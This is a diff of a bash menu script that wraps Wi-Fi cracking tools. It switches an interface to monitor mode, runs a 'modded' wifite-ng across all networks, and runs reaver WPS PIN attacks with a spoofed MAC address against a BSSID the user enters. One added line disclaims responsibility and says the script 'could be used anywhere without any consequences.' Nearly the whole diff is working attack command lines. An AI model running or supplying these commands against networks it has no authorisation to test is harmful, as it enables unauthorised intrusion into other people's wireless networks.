@@ -4,6 +4,7 @@
 # Warning :
 # ----------
 # I'm not responsible for anything.
+# This script could be used anywhere without any consequences to me.
 
 ROOT_UID = 0 # $UID = 0 is usually root.
 E_NOTROOT = 87 # Non-root exit error.
@@ -46,10 +47,9 @@ one() {
 	sleep 2
 	clear
 	monitor
-	wifite --all --mac --pixie
+	wifite-ng --all --mac --pixie # Use modded wifite
 	ifconfig wlan1 down
 	pause
-	
 }
 
 two() {
@@ -62,7 +62,7 @@ two() {
 	echo "Please enter BSSID from above : "
 	read BSSID
 	monitor
-	reaver -i wlan1 -b $BSSID -E -S -vv -N -T 1 -t 20 -d 0 -l 420 -m 9e:49:1f:d6:37:f4
+	reaver -i wlan1 -b $BSSID -E -S -vvv -N -T 1 -t 20 -d 0 -l 420 -m 9e:49:1f:d6:37:f4
 	ifconfig wlan1 down # Switch off
 	pause
 }
@@ -78,7 +78,7 @@ three() {
 	echo "Please enter the PIN : "
 	read PIN
 	monitor
-	reaver -i wlan1 -b $BSSID -E -S -vv -N -T 1 -t 20 -d 0 -l 420 -p $PIN -m 9e:49:1f:d6:37:f4
+	reaver -i wlan1 -b $BSSID -E -S -vvv -N -T 1 -t 20 -d 0 -l 420 -p $PIN -m 9e:49:1f:d6:37:f4
 	ifconfig wlan1 down # Switch off
 	pause
 }
